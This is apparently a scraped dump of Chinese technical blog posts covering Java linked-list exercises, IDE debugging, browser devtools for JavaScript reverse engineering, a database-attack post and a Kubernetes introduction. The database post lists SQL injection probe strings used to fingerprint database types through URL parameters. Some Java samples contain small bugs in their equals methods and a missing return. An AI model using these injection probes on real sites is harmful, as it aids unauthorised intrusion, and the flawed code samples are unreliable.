(this.next != null) &#123;//还有下一个数据                this.next.toArrayNode();            &#125;        &#125;        public E getNode(int index) &#123;            if (LinkImpl1.this.foot++ == index) &#123;                //索引相同                return this.data;            &#125; else &#123;                return this.next.getNode(index);            &#125;        &#125;        public void setNode(int index, E data) &#123;            if (LinkImpl1.this.foot++ == index) &#123;                //索引相同                this.data = data;            &#125; else &#123;                this.next.setNode(index, data);            &#125;        &#125;        public boolean containsNode(E data) &#123;            if (this.data.equals(data)) &#123;//对象比较                return true;            &#125; else &#123;                if (this.next == null) &#123;//无后续节点                    return false;                &#125; else &#123;                    return this.next.containsNode(data);//向后继续判断                &#125;            &#125;        &#125;        public void removeNode(Node previous, E data) &#123;            if (this.data.equals(data)) &#123;                previous.next = this.next;//空出当前节点            &#125; else &#123;                if (this.next != null) &#123; //有后续节点                    this.next.removeNode(this, data); //向后继续删除                &#125;            &#125;        &#125;    &#125;    // -----------以下为Link类中定义的成员----------    private Node root; //保存根元素    private int count;//保存数据个数    private int foot;//描述的是操作数组的脚标    private Object[] returnData;//返回的数据保存    // -----------以下为Link类中定义的方法----------    @Override    public void add1(E e) &#123;        if (e == null) &#123;            return;        &#125;        //数据本身是不具有关联性的,只有Node类有，那么想要实现关联处理就必须将数据包装在Node类之中        Node newNode = new Node(e);//创建一个新节点        if (this.root == null) &#123; //现在没有根节点            this.root = newNode; //现在第一个节点作为根节点        &#125; else &#123;            this.root.addNode(newNode);//将新节点保存在合适的位置        &#125;        this.count++;    &#125;    @Override    public int size1() &#123;        return this.count;    &#125;    @Override    public boolean isEmpty() &#123;        //return this.root == null;        return this.count == 0;    &#125;    @Override    public Object[] toArray() &#123;        if (this.isEmpty()) &#123;            return null;//无数据        &#125;        this.foot = 0;//脚标清0        this.returnData = new Object[this.count];//根据已有的长度开辟数组        this.root.toArrayNode();//利用Node类进行递归数据获取        return this.returnData;    &#125;    @Override    public E get(int index) &#123;        if (index &gt;= this.count) &#123;            return null;        &#125;        //索引数据的获取应该由Node类完成        this.foot = 0;//重置索引的下标        return this.root.getNode(index);    &#125;    @Override    public void set(int index, E data) &#123;        if (index &gt;= this.count) &#123;            return;//方法结束        &#125;        //索引数据的获取应该由Node类完成        this.foot = 0;//重置索引的下标        this.root.setNode(index, data);//修改数据    &#125;    @Override    public boolean contains(E data) &#123;        if (data == null) &#123;            return false;        &#125;        return this.root.containsNode(data);//交给Node类判断    &#125;    @Override    public void remove(E data) &#123;        if (this.contains(data)) &#123; //判断数据是否存在            if (this.root.data.equals(data)) &#123; //根节点为要删除节点                this.root = this.root.next; //根的下一个节点            &#125; else &#123; //交由Node类负责删除                this.root.next.removeNode(this.root, data);            &#125;            this.count--;        &#125;    &#125;    @Override    public void clean() &#123;        this.root = null; //后续所有的都没了        this.count = 0; //个数清零    &#125;&#125;interface Pet &#123;    public String getName1();    public String getColor1();&#125;class PetShop &#123; //宠物商店    private ILink1&lt;Pet&gt; allPets = new LinkImpl1&lt;&gt;(); //保存多个宠物信息    public void add1(Pet pet) &#123; //追加宠物，商品上架        this.allPets.add1(pet); //集合中保存对象    &#125;    public void delete1(Pet pet) &#123;        this.allPets.remove(pet);    &#125;    public ILink1&lt;Pet&gt; search(String keyword) &#123;        ILink1&lt;Pet&gt; searchResult = new LinkImpl1&lt;&gt;();//保存查询结果        Object result[] = this.allPets.toArray(); //获取全部数据        if (result != null) &#123;            for (Object obj : result) &#123;                Pet pet = (Pet) obj;                if (pet.getName1().contains(keyword) || pet.getColor1().contains(keyword)) &#123;                    searchResult.add1(pet);                &#125;            &#125;        &#125;        return searchResult;    &#125;&#125;class Cat implements Pet &#123;    private String name;    private String color;    public Cat(String name, String color) &#123;        this.name = name;        this.color = color;    &#125;    @Override    public String getName1() &#123;        return this.name;    &#125;    @Override    public String getColor1() &#123;        return this.color;    &#125;    public boolean equals(Object obj) &#123;        if (obj == null) &#123;            return false;        &#125;        if (!(obj instanceof Cat)) &#123;            return false;        &#125;        if (this == obj) &#123;            return true;        &#125;        Cat cat = (Cat) obj;        return this.name.equals(cat.name) &amp;&amp; this.color.equals(cat.color);    &#125;    public String toString() &#123;        return &quot;【宠物猫】名字&quot; + this.name + &quot;、颜色：&quot; + this.color;    &#125;&#125;class Dog implements Pet &#123;    private String name;    private String color;    public Dog(String name, String color) &#123;        this.name = name;        this.color = color;    &#125;    @Override    public String getName1() &#123;        return this.name;    &#125;    @Override    public String getColor1() &#123;        return this.color;    &#125;    public boolean equals(Object obj) &#123;        if (obj == null) &#123;            return false;        &#125;        if (!(obj instanceof Cat)) &#123;            return false;        &#125;        if (this == obj) &#123;            return true;        &#125;        Dog dog = (Dog) obj;        return this.name.equals(dog.name) &amp;&amp; this.color.equals(dog.color);    &#125;    public String toString() &#123;        return &quot;【宠物狗】名字&quot; + this.name + &quot;、颜色：&quot; + this.color;    &#125;&#125;public class Test65 &#123;    public static void main(String[] args) &#123;        PetShop shop = new PetShop();        shop.add1(new Dog(&quot;黄斑狗&quot;, &quot;绿色&quot;));        shop.add1(new Cat(&quot;小强猫&quot;, &quot;深绿色&quot;));        shop.add1(new Dog(&quot;黄狗&quot;, &quot;黄色&quot;));        shop.add1(new Dog(&quot;斑点狗&quot;, &quot;灰色&quot;));        Object result[] = shop.search(&quot;黄&quot;).toArray();        for (Object obj : result) &#123;            System.out.println(obj);        &#125;    &#125;&#125;\n\n​    所有的程序开发都是以接口为标准进行的，这样后期处理的时候可以非常的灵活，只要符合标准的对象都可以保存。\n链表综合实战：超市购物车​    使用面向对象的概念表示出下面的生活场景：小明去超市买东西，所有买到的东西都放在了购物车之中，最后到收银台一起结账。\n\n​    1、定义出一个商品的标准\ninterface IGoods &#123; //定义商品标准    public String getName1();    public double getPrice1();&#125;\n\n​    2、定义购物车处理标准\ninterface IShopCar &#123; //定义购物车标准    public void add1(IGoods goods);    public void delete1(IGoods goods);    public Object[] getAll1();//获得购物车全部标准信息&#125;\n\n​    3、定义购物车的实现类\nclass ShopCarImpl implements IShopCar&#123;    private ILink2&lt;IGoods&gt; allGoodses = new LinkImpl2&lt;&gt;();    @Override    public void add1(IGoods goods) &#123;        this.allGoodses.add1(goods);    &#125;    @Override    public void delete1(IGoods goods) &#123;        this.allGoodses.remove(goods);    &#125;    @Override    public Object[] getAll1() &#123;        return this.allGoodses.toArray();    &#125;&#125;\n\n​    4、定义收银台\nclass Cashier&#123; //收银台    private IShopCar shopCar;    public Cashier(IShopCar shopCar)&#123;        this.shopCar = shopCar;    &#125;    public double allPrice()&#123; //计算总价        double all = 0.0;        Object result[] = this.shopCar.getAll1();        for (Object obj : result)&#123;            IGoods goods = (IGoods) obj;            all += goods.getPrice1();        &#125;    &#125;    public int allCount()&#123; //商品数量        return this.shopCar.getAll1().length;    &#125;&#125;\n\n​    5、定义商品信息\nclass Book implements IGoods &#123;    private String name;    private double price;    public Book(String name, double price) &#123;        this.name = name;        this.price = price;    &#125;    @Override    public String getName1() &#123;        return this.name;    &#125;    @Override    public double getPrice1() &#123;        return this.price;    &#125;    public boolean equals(Object obj) &#123;        if (obj == null) &#123;            return false;        &#125;        if (this == obj) &#123;            return true;        &#125;        if (!(obj instanceof Book)) &#123;            return false;        &#125;        Book book = (Book) obj;        return this.name.equals(book.name) &amp;&amp; this.price == book.price;    &#125;    public String toString() &#123;        return &quot;【图书信息】名称：&quot; + this.name + &quot;【图书价格】价格：&quot; + this.price;    &#125;&#125;\n\n​    6、进行代码测试的编写\npublic static void main(String[] args) &#123;    IShopCar car = new ShopCarImpl();    car.add1(new Book(&quot;java开发&quot;, 79.8));    car.add1(new Book(&quot;Oracle&quot;, 89.8));    car.add1(new Bag(&quot;小强背包&quot;, 898.1));    Cashier cas = new Cashier(car);    System.out.println(&quot;总价格：&quot; + cas.allPrice() + &quot;、购买数量：&quot; + cas.allCount());&#125;\n\n范例：\npackage two;//链表超市购物车interface ILink2&lt;E&gt; &#123; //设置泛型避免安全隐患    public void add1(E e);//增加节点    public int size1();//获取数据个数    public boolean isEmpty();//判断空集合    public Object[] toArray();//将集合元素以数组形式返回    public E get(int index);//根据索引找到数据    public void set(int index, E data);//修改索引数据    public boolean contains(E data);//判断数据是否存在    public void remove(E data);//数据删除方法    public void clean();//清空集合&#125;class LinkImpl2&lt;E&gt; implements ILink2&lt;E&gt; &#123;    //保存节点的数据关系    private class Node &#123;        private E data; //保存的数据        private Node next; //保存下一个引用        //限制node必须有数据，有数据才有意义        public Node(E data) &#123;            this.data = data;        &#125;        //第一次调用：this = LinkImpl.root;        //第二次调用：this = LinkImpl.root.next;        //第三次调用: this = LinkImpl.root.next.next;        public void addNode(Node newNode) &#123; //保存新的node数据            if (this.next == null) &#123;                this.next = newNode;            &#125; else &#123;                this.next.addNode(newNode);            &#125;        &#125;        //第一次调用:this = LinkImpl.root        //第二次调用:this = LinkImpl.root.next        //第三次调用: this = LinkImpl.root.next.next;        public void toArrayNode() &#123;            LinkImpl2.this.returnData[LinkImpl2.this.foot++] = this.data;            if (this.next != null) &#123;//还有下一个数据                this.next.toArrayNode();            &#125;        &#125;        public E getNode(int index) &#123;            if (LinkImpl2.this.foot++ == index) &#123;                //索引相同                return this.data;            &#125; else &#123;                return this.next.getNode(index);            &#125;        &#125;        public void setNode(int index, E data) &#123;            if (LinkImpl2.this.foot++ == index) &#123;                //索引相同                this.data = data;            &#125; else &#123;                this.next.setNode(index, data);            &#125;        &#125;        public boolean containsNode(E data) &#123;            if (this.data.equals(data)) &#123;//对象比较                return true;            &#125; else &#123;                if (this.next == null) &#123;//无后续节点                    return false;                &#125; else &#123;                    return this.next.containsNode(data);//向后继续判断                &#125;            &#125;        &#125;        public void removeNode(Node previous, E data) &#123;            if (this.data.equals(data)) &#123;                previous.next = this.next;//空出当前节点            &#125; else &#123;                if (this.next != null) &#123; //有后续节点                    this.next.removeNode(this, data); //向后继续删除                &#125;            &#125;        &#125;    &#125;    // -----------以下为Link类中定义的成员----------    private Node root; //保存根元素    private int count;//保存数据个数    private int foot;//描述的是操作数组的脚标    private Object[] returnData;//返回的数据保存    // -----------以下为Link类中定义的方法----------    @Override    public void add1(E e) &#123;        if (e == null) &#123;            return;        &#125;        //数据本身是不具有关联性的,只有Node类有，那么想要实现关联处理就必须将数据包装在Node类之中        Node newNode = new Node(e);//创建一个新节点        if (this.root == null) &#123; //现在没有根节点            this.root = newNode; //现在第一个节点作为根节点        &#125; else &#123;            this.root.addNode(newNode);//将新节点保存在合适的位置        &#125;        this.count++;    &#125;    @Override    public int size1() &#123;        return this.count;    &#125;    @Override    public boolean isEmpty() &#123;        //return this.root == null;        return this.count == 0;    &#125;    @Override    public Object[] toArray() &#123;        if (this.isEmpty()) &#123;            return null;//无数据        &#125;        this.foot = 0;//脚标清0        this.returnData = new Object[this.count];//根据已有的长度开辟数组        this.root.toArrayNode();//利用Node类进行递归数据获取        return this.returnData;    &#125;    @Override    public E get(int index) &#123;        if (index &gt;= this.count) &#123;            return null;        &#125;        //索引数据的获取应该由Node类完成        this.foot = 0;//重置索引的下标        return this.root.getNode(index);    &#125;    @Override    public void set(int index, E data) &#123;        if (index &gt;= this.count) &#123;            return;//方法结束        &#125;        //索引数据的获取应该由Node类完成        this.foot = 0;//重置索引的下标        this.root.setNode(index, data);//修改数据    &#125;    @Override    public boolean contains(E data) &#123;        if (data == null) &#123;            return false;        &#125;        return this.root.containsNode(data);//交给Node类判断    &#125;    @Override    public void remove(E data) &#123;        if (this.contains(data)) &#123; //判断数据是否存在            if (this.root.data.equals(data)) &#123; //根节点为要删除节点                this.root = this.root.next; //根的下一个节点            &#125; else &#123; //交由Node类负责删除                this.root.next.removeNode(this.root, data);            &#125;            this.count--;        &#125;    &#125;    @Override    public void clean() &#123;        this.root = null; //后续所有的都没了        this.count = 0; //个数清零    &#125;&#125;interface IGoods &#123; //定义商品标准    public String getName1();    public double getPrice1();&#125;interface IShopCar &#123; //定义购物车标准    public void add1(IGoods goods);    public void delete1(IGoods goods);    public Object[] getAll1();//获得购物车全部标准信息&#125;class ShopCarImpl implements IShopCar &#123;    private ILink2&lt;IGoods&gt; allGoodses = new LinkImpl2&lt;&gt;();    @Override    public void add1(IGoods goods) &#123;        this.allGoodses.add1(goods);    &#125;    @Override    public void delete1(IGoods goods) &#123;        this.allGoodses.remove(goods);    &#125;    @Override    public Object[] getAll1() &#123;        return this.allGoodses.toArray();    &#125;&#125;class Cashier &#123; //收银台    private IShopCar shopCar;    public Cashier(IShopCar shopCar) &#123;        this.shopCar = shopCar;    &#125;    public double allPrice() &#123; //计算总价        double all = 0.0;        Object result[] = this.shopCar.getAll1();        for (Object obj : result) &#123;            IGoods goods = (IGoods) obj;            all += goods.getPrice1();        &#125;        return all;    &#125;    public int allCount() &#123; //商品数量        return this.shopCar.getAll1().length;    &#125;&#125;class Book implements IGoods &#123;    private String name;    private double price;    public Book(String name, double price) &#123;        this.name = name;        this.price = price;    &#125;    @Override    public String getName1() &#123;        return this.name;    &#125;    @Override    public double getPrice1() &#123;        return this.price;    &#125;    public boolean equals(Object obj) &#123;        if (obj == null) &#123;            return false;        &#125;        if (this == obj) &#123;            return true;        &#125;        if (!(obj instanceof Book)) &#123;            return false;        &#125;        Book book = (Book) obj;        return this.name.equals(book.name) &amp;&amp; this.price == book.price;    &#125;    public String toString() &#123;        return &quot;【图书信息】名称：&quot; + this.name + &quot;【图书价格】价格：&quot; + this.price;    &#125;&#125;class Bag implements IGoods &#123;    private String name;    private double price;    public Bag(String name, double price) &#123;        this.name = name;        this.price = price;    &#125;    @Override    public String getName1() &#123;        return this.name;    &#125;    @Override    public double getPrice1() &#123;        return this.price;    &#125;    public boolean equals(Object obj) &#123;        if (obj == null) &#123;            return false;        &#125;        if (this == obj) &#123;            return true;        &#125;        if (!(obj instanceof Book)) &#123;            return false;        &#125;        Bag bag = (Bag) obj;        return this.name.equals(bag.name) &amp;&amp; this.price == bag.price;    &#125;    public String toString() &#123;        return &quot;【背包信息】名称：&quot; + this.name + &quot;【背包价格】价格：&quot; + this.price;    &#125;&#125;public class Test66 &#123;    public static void main(String[] args) &#123;        IShopCar car = new ShopCarImpl();        car.add1(new Book(&quot;java开发&quot;, 79.8));        car.add1(new Book(&quot;Oracle&quot;, 89.8));        car.add1(new Bag(&quot;小强背包&quot;, 898.1));        Cashier cas = new Cashier(car);        System.out.println(&quot;总价格：&quot; + cas.allPrice() + &quot;、购买数量：&quot; + cas.allCount());    &#125;&#125;\n\n​    整体的代码都是基于链表的功能实现的，可以避免数组内容的频繁修改。\n\n开发工具Debug​    1、新建一个程序类\npackage two;//debugpublic class Test67 &#123;    private Test67()&#123;&#125;    public static int add(int x, int y) &#123;        int result = 0;        result = x + y;        return result;    &#125;&#125;\n\npackage two;//debugpublic class Test68 &#123;    public static void main(String[] args) &#123;        int numA = 10;        int numB = 20;        System.out.println(Test67.add(numA,numB));    &#125;&#125;\n\n​    2、如果要进行代码调试，那么一定要保证设置有一个程序的断点（Break Point）\n\n​    3、进入调试视图\n\n​    4、\n\n横 1：从其他界面回到当前断点界面光标处。\n横 2：从断点处开始，逐行执行代码，如果遇到方法，直接跳过。\n横 3：从断点处开始，逐行执行代码，如果遇到方法，会进入方法，但是只能进入自定义方法，不会进入官方类库的方法。\n横 4：从断点处开始，逐行执行代码，如果遇到方法，会进入方法，适用于所有方法。\n横 5：从当前断点处回退，回到方法的调用处。\n横 6：回退断点，回到上一个断点处，与横 5 的区别在于，它会回到上一个方法的断点中，而横 5 只会回到上一个方法的调用处，并不会进入方法。\n横 7：回到断点光标处，与横 1 的区别在于，它会继续往后执行一行代码。\n横 8：计算表达式，在 debug 模式中，可以直接输入当前类中的任意一个方法，直接进行运算，输出结果，如下图所示。\n\n竖 1：重新运行程序，进入 debug 模式。\n竖 2：执行程序，但不是逐行执行，而是跳转到下一个断点处。\n竖 3：暂停断点，这个基本用不到。\n竖 4：终止程序的运行。\n竖 5：显示所有断点，如下图所示。\n竖 6：让所有断点失效，debug 不再进入断点，要恢复断点，再次点击此按钮即可。\n5、\n​    1、设置断点条件\n​    可以手动设置进入断点的条件，比如代码如下所示。\nfor (int i = 0; i &lt; 100; i++) &#123;   System.out.println(i);&#125;\n\n​    如果我们在这个循环中打断点，那么每次执行循环都会进入断点，我们可以通过设置断点条件来控制是否进入断点，比如只需要在 i = 10 的时候进入断点，则可以在断点处右键，在弹出的对话框的 Condition 中输入条件，如下所示。\n\n​    再次执行程序，可以看到 i == 10 的时候进入断点。\n\n​    2、动态修改变量的值\n​    在 debug 模式中，可以手动修改程序中变量的值，比如代码如下所示。\npublic static void test3()&#123;   int add = add(1, 2);   System.out.println(add);&#125;public static int add(int i,int j)&#123;   return i+j;&#125;\n\n​    变量 add 的值应该是 3，我们可以手动修改它的值，在控制台的 Variables 中选择 Set Value，具体操作如下所示。\n\n​    然后继续执行代码，可以看到控制台输出的就是 6。\n\n​    当然，这只是临时的修改，下一次程序运行，结果仍然是 3。\n​    3、多线程断点调试\n​    在多线程的情况下，我们可以对线程的执行顺序进行控制，比如代码如下所示。\nnew Thread(()-&gt;&#123;   System.out.println(&quot;线程1-1&quot;);   System.out.println(&quot;线程1-2&quot;);   System.out.println(&quot;线程1-3&quot;);&#125;).start();new Thread(()-&gt;&#123;   System.out.println(&quot;线程2-1&quot;);   System.out.println(&quot;线程2-2&quot;);   System.out.println(&quot;线程2-3&quot;);&#125;).start();\n\n​    运行结果如下图所示。\n\n​    如果我们希望按照 线程1-1，线程2-1，线程1-2，线程2-2，线程1-3，线程2-3 的顺序输出，可以通过设置断点执行顺序来实现，具体操作如下所示。\n\n​    先在两个线程代码中打断点，然后在断点处右键，设置为 Thread，如下图所示。\n\n​    接下来执行程序，进入断点的时候，通过切换当前线程来实现交替执行，比如第一次执行为 Thread-0，那么接下来就切换到 Thread-1 执行，然后再切换到 Thread-0 来执行，如下图所示。\n\n\n​    这样反复切换执行完毕之后，运行结果如下图所示。\n\n**    4、同时运行多个服务。**\n​    我们在做分布式开发的时候，同一个项目往往同时要启动调试多个服务实例，但是当我们第二次启动服务的时候，会弹出如下界面，意思是需要停止当前服务，才能重新启动第二个。\n\n​    这个问题我们只需要做一个简单的配置就能解决，选择 Edit Configurations。\n\n​    在弹出的窗口中勾选 Allow parallel run 即可，这样就可以同时启动多个服务了。\n\n​    此篇结束，下一篇进入Java高级编程，会介绍反射等相关知识。\n","categories":["Java安全基础篇"],"tags":["开发","数据结构","Java","安全"]},{"title":"Python爬虫从一到二(JS逆向)","url":"/2022/10/09/Python%E7%88%AC%E8%99%AB%E4%BB%8E%E4%B8%80%E5%88%B0%E4%BA%8C-JS%E9%80%86%E5%90%91/","content":"​    可先看从零到一，无前言\n浏览器开发者工具F12\n\nElements（元素面板）：使用“元素”面板可以通过自由操纵 DOM 和 CSS 来重您网站的布局和设计。\nConsole（控制台面板）：在开发期间，可以使用控制台面板记录诊断信息，或者使用它作为 shell，在页面上与 JavaScript 交互。\nSources（源代码面板）：在源代码面板中设置断点来调试 JavaScript ，或者通过 Workspaces（工作区）连接本地文件来使用开发者工具的实时编辑器。\nNetwork（网络面板）：从发起网页页面请求 Request 后得到的各个请求资源信息（包括状态、资源类型、大小、所用时间等），并可以根据这个进行网络性能优化。\nPerformance（性能面板）：使用时间轴面板，可以通过记录和查看网站生命周期内发生的各种事件来提高页面运行时的性能。\nMemory（内存面板）：分析 web 应用或者页面的执行时间以及内存使用情况。\nApplication（应用面板）：记录网站加载的所有资源信息，包括存储数据（Local Storage、 Session Storage、IndexedDB、Web SQL、Cookies）、缓存数据、字体、图片、脚本、样式 表等。\nSecurity（安全面板）：使用安全面板调试混合内容问题，证书问题等等。\nLighthouse（诊断面板）：对当前网页进行网络利用情况、网页性能方面的诊断，并给出一些优化 建议。\n元素选择：可以直接点击页面的元素，会自动跳转到对应的源代码\n终端模拟：模拟各种终端设备，支持自定义终端。\n自定义：自定义和控制开发者工具，包括调整工具的位置、全局搜索、运行命令、其他工具等。\n\n终端模拟​    点击可以模拟各种终端设备，适合查看手机页面的数据，点击【More tools】—&gt; 【Sensors】可以模拟终端的地理位置、终端朝向等；工具栏可以选择要模拟的终端型号，其中 Responsive 是自适应。\n\nNetwork面板\nControls控制器​    Preserve log：是否在页面重加载后，清除请求列表。\n​    Disable cache：是否启用缓存。\n是否开启抓包。\n清除请求。\n是否隐藏 Filter（过滤器)窗格。\nNetwork conditions，网络条件，允许在各种网络环境中测试网站，包括 3G，离线等，还可以自定义限制最大下载和上传流量。\nImport/Export HAR file，导入导出抓包数据。\nFilter过滤器\nHide data URLs：data URLs 指一些嵌入到文档中的小型文件，在请求表里面以 data: 开头的文件就是，如较为常见的 svg 文件。勾选 Hide data URLs复选框即可隐藏此类文件。\nAll：显示所有请求。\nXHR：全称 XMLHttpRequest，是一种创建 AJAX 请求的 JavaScript API，通常抓取 Ajax 请求可以选择 XHR。\nWS：全称 WebSocket，是 HTML5 开始提供的一种在单个 TCP 连接上进行全双工通讯的协议。\nManifest：安卓开发文件名，属于 AndroidManifest.xml 文件，在简单的 Android 系统的应用中提出了重要的信息码。\nHas blocked cookies：仅显示具有阻止响应 cookie 的请求。\nBlocked Requests：只显示被阻止的请求。\n\n断点调试\n\nCtrl+Shift+F 或者右上角三个点打开全局搜索，搜索关键字。\n定位到可疑代码，点击行号埋下断点。\n调试代码，分析逻辑，其中 console 模板可以直接编写 JS 代码进行调试。\n\n执行到下一个断点。\n执行下一步，不会进入所调用的函数内部\n进入所调用的函数内部\n跳出函数内部\n一步步执行代码，遇到有函数调用，则进入函数\n停用断点\n不要在出现异常时暂停\n​    Breakpoints：可以看到已经埋下的断点。\n​    Scope：可以看到当前局部或者全局变量的值，可对值进行修改。\n​    Call Stack：可以看到当前代码调用的堆栈信息，代码执行顺序为由下至上。\nXHR断点​    匹配 url 中关键词，匹配到则跳转到参数生成处，适用 于url中的加密参数全局搜索搜不到，可采用这种方式拦截。\n\n行为断点​    Event Listener Breakpoints，事件侦听器断点，当鼠标点击、移动、键盘按键等行为或者其他事件发生时可以触发断点，比如 Mouse —&gt; click，可快速定位点击按钮后，所执行的 JS。\n\n插入JS​    在 sources —&gt; snippets 下可以新建 JS 脚本。\n\n打印windows对象的值​    在 console 中输入如下代码，如只打印 _$ 开头的变量值：\nfor (var p in window) &#123;    if (p.substr(0, 2) !== &quot;_$&quot;)         continue;    console.log(p + &quot; &gt;&gt;&gt; &quot; + eval(p))&#125;\n\n无限debugger防调试​    某些页面打开调试工具会出现无限 debugger 的现象：\n","categories":["Python爬虫篇"],"tags":["Python","爬虫","JS","JS逆向"]},{"title":"数据库攻击面😪","url":"/2022/08/26/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E5%87%BB%E9%9D%A2%F0%9F%98%AA/","content":"数据库类型判断常见前端与数据库类型asp：SQL Server，Access.net：SQL Serverphp：MySQL，PostgreSQLjava：Oracle，MySQL\n\n常见端口Oracle：默认端口1521SQL Server：默认端口1433MySQL：默认端口3306\n\n特有函数判断version()和@@version()\n1.  ORACLE : Select banner from v$version;2.  MS-SQL : Select @@version;3.  MYSQL : Select @@version;4.  postgresql : Select version();5.  select version()：#MySQL查询版本信息的函数6.  select @@version：#MySQL和SQL Server查询版本信息的函数\n\nLen()和length()\n​    在mssql以及db2内，返回长度值是调用len()函数；在oracle和mysql则是通过length()来返回长度值。\n 当你使用and len(&#39;a&#39;)=1的时候，返回正常页面时，可以推断当前的数据库类型可能是mssql，或是db2。反之则可能会是oracle和mysql。\n\n\nsubstring和substr\n​    MySQL两个函数都可以使用​    Oracle只可调用substr​    SQL Server只可调用substring\n符号判断​    “#”是MySQL中的注释符，另外也支持-- 和/**/，返回错误说明该注入点不是MySQL，继续提交如下查询字符：\n​    “–”是Oracle和MSSQL支持的注释符，如果返回正常，则说明为这两种数据库类型之一。继续提交如下查询字符：\n​    “;”是子句查询标识符，Oracle不支持多行查询，因此如果返回错误，则说明很可能是Oracle数据库。\n​    有时利用–和# 这两个注释符号也可以大致的确认数据库类型，因为MSSQL是–，而MYSQL是#，ACCESS不支持注释。\n​    Http://xxx.xxx.xxx/abc.asp?p=YY– 异常\n​    HTTP://xxx.xxx.xxx/abc.asp?p=YY#  正常\n​    那么数据库有可能就是MYSQL或者ACCESS。\n 在注入点后加（必须为注入点）;--（一个分号，两个横线），例如：\n\n​    Http://xxxx/article/as.asp?id=1;–\n​    如果返回正常的话，说明数据库是MSSQL。在MSSQL数据库中;和–都是存在的，;用来分离两个语句，而–就是注释符，它后面语句都不执行。如果返回错误，基本可以肯定是ACCESS数据库了。\n根据数据库对字符串的处理方式判断​    MySQL ：\nhttp://127.0.0.1/test.php?id=1 and &#x27;a&#x27;+&#x27;b&#x27;=&#x27;ab&#x27; http://127.0.0.1/test.php?id=1 and CONCAT(&#x27;a&#x27;,&#x27;b&#x27;)=&#x27;ab&#x27; \n\n​    Oracle ：\nhttp://127.0.0.1/test.php?id=1 and &#x27;a&#x27;||&#x27;b&#x27;=&#x27;ab&#x27; http://127.0.0.1/test.php?id=1 and CONCAT(&#x27;a&#x27;,&#x27;b&#x27;)=&#x27;ab&#x27; \n\n​    SQL Server ：\nhttp://127.0.0.1/test.php?id=1 and &#x27;a&#x27;+&#x27;b&#x27;=&#x27;ab&#x27; \n\n数据库特征​    MYSQL：\nid=2 and version()&gt;0 返回正常id=2 and length(user())&gt;0id=2 and CHAR(97, 110, 100, 32, 49, 61, 49)\n\n​    MSSQL：\nID=1 and (select count (*) from sysobjects)&gt;0 返回正常ID=1 and (select count (*) from msysobjects)&gt;0返回异常ID=1 and left(version(),1)= 5%23ID=1 and exists(select id from sysobjects)ID=1 and length(user)&gt;0ID=1 CHAR(97) + CHAR(110) + CHAR(100) + CHAR(32) + CHAR(49) + CHAR(61) + CHAR(49)\n\n​    ACCESS：\nID=1 and (select count (*) from sysobjects)&gt;0 返回异常ID=1 and (select count (*) from msysobjects)&gt;0返回异常\n\n​    ORACLE:\nID=1  and &#x27;1&#x27;||&#x27;1&#x27;=&#x27;11 ID=1  and 0&lt;&gt;(select count(*) from dual)ID=1 CHR(97) || CHR(110) || CHR(100) || CHR(32) || CHR(49) || CHR(61) || CHR(49)\n\n\n\nMysql​    首先我们启动一个docker，对于docker不会的可以去看我以前的文章，里面介绍的很详细。\n​    启动一个mysql容器，已经启动成功。\ndocker run -p 3307:3306 --name mes9s0-mysql -v ~/mysql/data:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=password  容器ID\n\n\n​    注意：1、端口映射唯一性：一个容器只能映射到本机的唯一一个端口，故如果创建了一个容器，该容器在运行中，该容器映射到本地的端口为3306， 那么就不能再创建一个容器映射在3306端口号上，因为该端口已经被分配给了第一个容器；2、容器名字唯一性：创建的容器的名字不能与已经存在 的容器名字重复。否则创建容器失败。\n​    可以写一个docker-compose.yml，方便下次启动\nversion: &#x27;2&#x27;services:  mysql-database:    image: mysql    ports:    - &quot;3307:3306&quot;    restart: always    environment:      MYSQL_DATABASE: 数据库名  // 这里docker 在启动的时候，会自动创建该数据库，不需要手动去创建      MYSQL_USER: root      MYSQL_ROOT_PASSWORD: 数据库密码\n\n​    然后我们启动phpmyadmin的容器，启动方法如下：\n# 启动镜像docker run -d --name phpmyadmin --link mes9s0-mysql:db -p 8080:80 phpmyadmin# 修改容器配置文件docker cp phpmyadmin:/etc/phpmyadmin/config.inc.php .## 修改配置文件信息(这里修改的db就是在启动的时候--link后面指定的别名)$cfg[&#x27;Servers&#x27;][$i][&#x27;host&#x27;] = &#x27;localhost&#x27; ——&gt; $cfg[&#x27;Servers&#x27;][$i][&#x27;host&#x27;] = &#x27;db&#x27;## 将修改后的配置文件复制回容器中docker cp ./config.inc.php phpmyadmin:/etc/phpmyadmin/docker restart phpmyadmin\n\n​    这里提供一个网络的docker-compose（没试过，可以修改试试）\nversion: &quot;2&quot;services:  mysql:    image: hub.c.163.com/library/mysql    container_name: test-mysql    restart: always    ports:      - &quot;3306:3306&quot;    environment:      MYSQL_USER: &quot;root&quot;      MYSQL_PASSWORD: &quot;root&quot;      MYSQL_ROOT_PASSWORD: &quot;root&quot;    networks:      - net-mysql  phpmyadmin:    image: docker.io/phpmyadmin/phpmyadmin    container_name: test-myadmin    ports:      - &quot;80:80&quot;    environment:      MYSQL_USER: &quot;root&quot;      MYSQL_PASSWORD: &quot;root&quot;      MYSQL_ROOT_PASSWORD: &quot;root&quot;    networks:      - net-mysqlnetworks:  net-mysql:\n\n​    另外：关于phpmyadmin的启动方法可看以下文章：https://www.jb51.net/article/235796.htm。顺便说一下，启动后chrome打开会有cookie相关错误，我这里使用firefox打开，可以看到已经成功访问。\n\nMysql攻击面​    \n","categories":["数据库攻击汇总篇"],"tags":["红队","REDTEAM","数据库","渗透测试"]},{"title":"K8S && 云原生?","url":"/2022/05/18/K8S-%E4%BA%91%E5%8E%9F%E7%94%9F/","content":"​    没有前言…\n什么是云原生历史的纬度各种模型\n分布式系统​    现阶段的分布式应用拥有提升系统容量，加强系统可用性的有点，但也有一些缺点，具体如图：\n\n​    相对的，为了应对这些不足，出现了以下这些技术手段解决：服务治理（依赖关系、调用链）、架构管理（版本管理、生命周期管理、编排、聚合、调度）、DevOps、自动化运维、资源调度管理、整体架构监控、流量治理（负载均衡、路由、熔断、…）\n创建运行分布式应用的需求​    运行分布式应用的典型需求有如下几个类别：1、生命周期管理；2、网络管理；3、状态存储管理；4、绑定（与内部的或者外部的应用集成）\n\n​    